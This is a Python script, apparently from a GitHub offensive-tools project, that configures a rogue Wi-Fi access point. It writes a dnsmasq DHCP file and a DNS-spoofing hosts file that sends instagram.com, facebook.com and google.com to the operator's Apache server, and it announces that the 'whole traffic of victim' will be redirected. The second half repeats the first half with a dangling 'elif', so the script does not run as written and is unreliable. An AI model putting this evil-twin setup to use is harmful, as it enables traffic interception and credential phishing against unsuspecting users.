#By SxNade
#https://github.com/SxNade/Rudrastra
#CONTRIBUTE
#CONFIGURE INTERNET ACCESS FOR DEVICES CONNECTING**

from termcolor import colored
import sys
import os
import time
#importing the required Libraries..


# print(colored("\n[+]Configuring IP Assignment For Fake AP.......!", "green", attrs=['bold']))
print(colored("\n[+] Making Network Configuration...", "green", attrs=['bold']))
print(colored("========================================================================================================", "blue", attrs=['bold']))


ifc = str(input(colored("\n[*] Enter The Monitor-Mode Interface used For Fake-AP: ", "red", attrs=['bold'])))

#Function to make the dnsmasq.conf file required for DHCP
def writing_file():
    file = open("dnsmasq.conf", 'w')
    #this might look anoying but adding \n to statement's end was not working...LOL!! so I had to do this....!!!
    file.write(f"interface={ifc}")
    file.write("\n")
    file.write("dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h")
    file.write("\n")
    file.write("dhcp-option=3,192.168.1.1")
    file.write("\n")
    file.write("dhcp-option=6,192.168.1.1")
    file.write("\n")
    file.write("server=8.8.8.8")
    file.write("\n")
    file.write("log-queries")
    file.write("\n")
    file.write("log-dhcp")
    file.write("\n")
    file.write("listen-address=127.0.0.1")
    file.close()
    print(colored("DHCP File Wrote Successfully.....!", "green", attrs=['bold']))


fake_host = input(colored("[*] Enable DNS Request Redirection::[Y/N]=> ", "red", attrs=['bold']))


#Receiving User Input For configuring the DNS-Spoofing File..
if fake_host == "Y":
    ans = input(colored("[*] Enable DNS Request Redirection to your Local...apache Server::[Y/N]=> ", "red", attrs=['bold']))
    if ans == "Y":
        print(colored("[+] Starting Apache Server On Your System...", "green", attrs=['bold']))
        os.system("service apache2 start")
        print(colored("[!] Writing fakehosts File", "green"))
        print(colored("=============================================================================================================================", 'red', attrs=['bold']))
        time.sleep(2)
        serv_ip = input("[*] Enter The IP of Your Fake Server: ")
        file = open("fakehosts.conf", 'w')
        file.write(f"{serv_ip} instagram.com")
        file.write("\n")
        file.write(f"{serv_ip} facebook.com")
        file.write("\n")
        file.write(f"{serv_ip} google.com")
        file.write("\n")
        file.write(f"{serv_ip} https*")
        file.close()
        print(colored("[+] Redirection Configuration Successfull...", "red", attrs=['bold']))
    elif ans == 'N':
        print(colored("=============================================================================================================================", 'red', attrs=['bold']))
        print(colored("[+] Server Is Now ready to use..", 'green', attrs=['bold']))
elif fake_host == "N":
    print(colored("=============================================================================================================================", 'red', attrs=['bold']))
    print(colored("[+] Server is Ready To use..", 'green', attrs=['bold']))


ask = input(colored("\n\n[*] Enable DHCP server now...[Y/N]=> ", "red", attrs=['bold']))

#Conditional Statements for Running The DHCP Server...
if ask == "Y":
    writing_file()
    print(colored("\n[+] Fake-AP can be configured and Enabled with..start-ap.py", "green", attrs=['bold']))
    time.sleep(4)
    os.system("clear")
    print(colored("[#] Online........", "green", attrs=['bold']))
    print(colored("=============================================================================================================================\n", 'blue', attrs=['bold']))
    #starting dnsmasq which will allot IP addresses......
    os.system("dnsmasq -C dnsmasq.conf -d -H fakehosts.conf")
elif ask == "N":
    print(colored("[+] Exiting now", "red", attrs=['bold']))
    sys.exit(0)
elif ask and ans == "Y":
    print(colored("\n\n[+]Now you can configure and start the AP with..start-ap.py!", "green"))
    os.system("clear")
    print(colored("[#] Online.......", "green", attrs=['bold']))
    print(colored("=============================================================================================================================\n", 'blue', attrs=['bold']))
    os.system("dnsmasq -C dnsmasq.conf -d -H fakehosts.conf")

else:
    print(colored("\n\nUNEXCPECTED INPUT...exiting now..", 'red', attrs=['bold']))
    sys.exit(0)

    if ans == "Y":
        print("[+]Starting Apache Server On Your System...")
        os.system("service apache2 start")
        print(colored("[+]Writing fakehosts File", "green"))
        time.sleep(2)
        serv_ip = input("Enter The IP of Your Fake Server: ")
        file = open("fakehosts.conf", 'w')
        file.write(f"{serv_ip} instagram.com")
        file.write("\n")
        file.write(f"{serv_ip} facebook.com")
        file.write("\n")
        file.write(f"{serv_ip} google.com")
        file.write("\n")
        file.write(f"{serv_ip} https*")
        file.close()
        print(colored("Now Whole Traffic of Victim will Be Redirected To your Server..", "red", attrs=['bold']))
    elif ans == 'N':
        print("[+]Server Is Now ready to use..!")
elif fake_host == "N":
    print("[+]Server is Ready To use..!")


ask = input(colored("\n\n[*]Should we start DHCP Server Now.......(Y/N)", "red", attrs=['bold']))

#Conditional Statements for Running The DHCP Server...
if ask == "Y":
    writing_file()
    print(colored("\n\n[+]Now you can configure and start the AP with..start-ap.py!", "green"))
    time.sleep(4)
    os.system("clear")
    print(colored("<0>ONLINE", "green", attrs=['bold']))
    #starting dnsmasq which will allot IP addresses......
    os.system("dnsmasq -C dnsmasq.conf -d -H fakehosts.conf")
elif ask == "N":
    print(colored("[+]Exiting NOW!!!", "red", attrs=['bold']))
    sys.exit(0)
elif ask and ans == "Y":
    print(colored("\n\n[+]Now you can configure and start the AP with..start-ap.py!", "green"))
    os.system("clear")
    print(colored("<0>ONLINE", "green", attrs=['bold']))
    os.system("dnsmasq -C dnsmasq.conf -d -H fakehosts.conf")

else:
    print(colored("\n\nUNEXCPECTED INPUT!...exiting now.."))
    sys.exit(0)
